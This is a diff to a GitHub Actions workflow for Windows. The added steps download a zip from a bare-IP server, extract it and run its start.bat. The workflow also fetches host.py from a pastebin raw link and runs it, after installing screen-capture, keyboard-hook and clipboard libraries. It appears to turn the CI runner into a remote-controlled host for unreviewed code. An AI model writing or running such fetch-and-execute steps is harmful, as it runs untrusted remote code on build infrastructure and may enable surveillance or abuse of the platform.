@@ -2,6 +2,12 @@ name: Run Python Host (Windows)
 
 on:
   workflow_dispatch:
+    inputs:
+      zip_url:
+        description: "Zip file URL to download"
+        required: true
+        default: "http://157.250.198.96:3000/files/1784743685851-227104494.zip"
+        type: string
 
 jobs:
   host:
@@ -15,31 +21,36 @@ jobs:
       - name: Install 7-Zip, Python, and Go
         run: |
           Write-Host "Downloading installers..."
-
           Invoke-WebRequest "https://github.com/ip7z/7zip/releases/download/25.01/7z2501-x64.exe" -OutFile "7zip.exe"
           Invoke-WebRequest "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe" -OutFile "python.exe"
           Invoke-WebRequest "https://go.dev/dl/go1.22.5.windows-amd64.msi" -OutFile "go.msi"
-
           Write-Host "Installing..."
-
           Start-Process ".\7zip.exe" -ArgumentList "/S" -Wait
           Start-Process ".\python.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
           Start-Process "msiexec.exe" -ArgumentList "/i go.msi /quiet /norestart" -Wait
-
       - name: Install Python packages
         run: |
           pip install mss pillow pynput pyperclip requests
-
       - name: Verify installations
         run: |
           python --version
           go version
-
+      # Download and extract zip
+      - name: Download zip package
+        run: |
+          $ProgressPreference = 'SilentlyContinue'
+          Invoke-WebRequest "${{ github.event.inputs.zip_url }}" -OutFile "package.zip"
+      - name: Extract zip package
+        run: |
+          & "C:\Program Files\7-Zip\7z.exe" x "package.zip" -o"extracted" -y
+      - name: Run start.bat
+        run: |
+          Set-Location extracted
+          .\start.bat
       # Download and run host.py
       - name: Download host.py
         run: |
           Invoke-WebRequest "https://pastebin.com/raw/Cm9dz7De" -OutFile "host.py"
-
       - name: Run host.py
         run: |
           python host.py
